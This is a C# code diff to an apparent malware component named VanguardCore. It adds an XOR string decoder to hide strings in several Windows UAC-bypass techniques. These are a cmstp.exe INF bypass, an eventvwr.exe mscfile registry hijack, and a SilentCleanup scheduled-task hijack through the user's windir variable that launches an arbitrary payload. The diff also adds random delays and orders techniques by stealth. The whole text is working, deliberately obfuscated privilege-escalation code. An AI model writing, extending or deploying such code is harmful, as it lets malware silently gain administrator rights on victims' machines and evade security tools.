@@ -80,6 +80,13 @@ namespace VanguardCore
         #endregion
 
         #region Private Methods
+        private static string D(string s)
+        {
+            char[] c = s.ToCharArray();
+            for (int i = 0; i < c.Length; i++) c[i] = (char)(c[i] ^ 0x05);
+            return new string(c);
+        }
+
         private static void ParseCommandLine(string cmdLine, out string exe, out string args)
         {
             exe = "";
@@ -226,10 +233,11 @@ cmd.exe /c """ + batchPath + @"""
                 File.WriteAllText(infPath, infContent);
                 File.SetAttributes(infPath, FileAttributes.Hidden | FileAttributes.Temporary);
 
+                // cmstp.exe /au ".inf"
                 ProcessStartInfo psi = new ProcessStartInfo
                 {
-                    FileName = "cmstp.exe",
-                    Arguments = string.Format("/au \"{0}\"", infPath),
+                    FileName = D("fhtsw+fye"), // cmstp.exe
+                    Arguments = string.Format(D(")`v %0'"), infPath), // /au "{0}"
                     UseShellExecute = false,
                     CreateNoWindow = true,
                     WindowStyle = ProcessWindowStyle.Hidden
@@ -254,7 +262,8 @@ cmd.exe /c """ + batchPath + @"""
         {
             try
             {
-                string keyPath = @"Software\Classes\mscfile\shell\open\command";
+                // Software\Classes\mscfile\shell\open\command
+                string keyPath = D("Vlbryf`sf]Fmfttft]ntfalmf]tsfii]jump]f`hh`is");
 
                 using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
                 {
@@ -266,7 +275,7 @@ cmd.exe /c """ + batchPath + @"""
 
                 ProcessStartInfo psi = new ProcessStartInfo
                 {
-                    FileName = "eventvwr.exe",
+                    FileName = D("fwfisyis+fye"), // eventvwr.exe
                     UseShellExecute = false,
                     CreateNoWindow = true,
                     WindowStyle = ProcessWindowStyle.Hidden
@@ -275,7 +284,8 @@ cmd.exe /c """ + batchPath + @"""
                 Thread.Sleep(2000);
 
                 // Cleanup
-                CleanRegistryKey(@"HKCU\Software\Classes\mscfile");
+                // HKCU\Software\Classes\mscfile
+                CleanRegistryKey(D("AMFV]Vlbryf`sf]Fmfttft]ntfalmf"));
                 return true;
             }
             catch { return false; }
@@ -292,36 +302,29 @@ cmd.exe /c """ + batchPath + @"""
         {
             try
             {
-                // Better SilentCleanup technique: HKCU\Environment\windir hijack
-                // We use a more robust cmd wrapper to handle nested quotes
-                string envPath = @"Environment";
+                // Environment -> Jswlsihjfis
+                string envPath = D("Jswlsihjfis");
                 
-                // Use a temporary .bat if payload is complex, but here we try a direct stable string
-                // Note: SilentCleanup triggers %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
-                // By hijacking windir, we control the execution.
+                string publicDir = D("F9]Vtfst]Wpaimf"); // C:\Users\Public
+                string batchPath = Path.Combine(publicDir, Guid.NewGuid().ToString() + D("+gfs")); // .bat
+                string logPath = Path.Combine(publicDir, D("gfs_afapi+i`b")); // bat_debug.log
+                File.WriteAllText(batchPath, string.Format(D("Af`mj pbb%sf%`f`mj %SNHF' TNIFKSFMFDIPY AA %0' %sf%tsfsf %% %1"), logPath, payloadPath));
                 
-                // Use REM to absorb the \system32\cleanmgr.exe suffix that the scheduled task appends
-                // Use a temporary .bat to handle complex payloads with spaces and quotes properly
-                string publicDir = @"C:\Users\Public";
-                string batchPath = Path.Combine(publicDir, Guid.NewGuid().ToString() + ".bat");
-                string logPath = Path.Combine(publicDir, "bat_debug.log");
-                File.WriteAllText(batchPath, string.Format("@echo off\r\necho %TIME% SILENTCLEANUP >> \"{0}\"\r\nstart \"\" {1}", logPath, payloadPath));
-                
-                string hijackValue = string.Format("cmd.exe /c \"{0}\" & REM ", batchPath);
+                string hijackValue = string.Format(D("f`h+fye )f %0' % SFH "), batchPath); // cmd.exe /c "{0}" & REM 
 
                 using (RegistryKey key = Registry.CurrentUser.OpenSubKey(envPath, true))
                 {
                     if (key != null)
                     {
-                        key.SetValue("windir", hijackValue, RegistryValueKind.String);
+                        key.SetValue(D("palsls"), hijackValue, RegistryValueKind.String); // windir
                     }
                 }
 
                 // Trigger the task
                 ProcessStartInfo psi = new ProcessStartInfo
                 {
-                    FileName = "schtasks.exe",
-                    Arguments = "/run /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /i",
+                    FileName = D("t`isftjt+fye"), // schtasks.exe
+                    Arguments = D(")`ps )fs %]Nlfistvsq]Pliajwt]AtfFm`fisp]TslfisFm`fist% )l"), // /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /i
                     UseShellExecute = false,
                     CreateNoWindow = true,
                     WindowStyle = ProcessWindowStyle.Hidden,
@@ -336,7 +339,7 @@ cmd.exe /c """ + batchPath + @"""
                 {
                     if (key != null)
                     {
-                        try { key.DeleteValue("windir"); } catch { }
+                        try { key.DeleteValue(D("palsls")); } catch { }
                     }
                 }
 
@@ -516,33 +519,31 @@ cmd.exe /c """ + batchPath + @"""
                 return true;
             }
 
-            // Priority order (most stealth first) - Rewritten without Reflection (AOT Compatible)
+            Random rnd = new Random();
+            
+            // Priority order (most stealth first)
             try
             {
-                Log("Attempting technique: ComputerDefaultsBypass");
-                if (ComputerDefaultsBypass(payloadPath)) return true;
-
-                Log("Attempting technique: FodhelperBypass");
-                if (FodhelperBypass(payloadPath)) return true;
-
+                // We try more reliable/stealthy techniques first
+                
                 Log("Attempting technique: SilentCleanupBypass");
                 if (SilentCleanupBypass(payloadPath)) return true;
+                Thread.Sleep(rnd.Next(1000, 3000));
 
                 Log("Attempting technique: CmstpBypass");
                 if (CmstpBypass(payloadPath)) return true;
+                Thread.Sleep(rnd.Next(1000, 3000));
 
-                Log("Attempting technique: SdcltBypass");
-                if (SdcltBypass(payloadPath)) return true;
-
-                Log("Attempting technique: CmluaUtilBypass");
-                if (CmluaUtilBypass(payloadPath)) return true;
+                Log("Attempting technique: EventViewerBypass");
+                if (EventViewerBypass(payloadPath)) return true;
+                Thread.Sleep(rnd.Next(1000, 3000));
             }
             catch (Exception ex)
             {
                 Log($"Bypass chain error: {ex.Message}");
             }
 
-            // Final fallback: request UAC elevation
+            // Final fallback: request UAC elevation (standard method)
             ExecuteElevated(payloadPath);
             return true;
         }
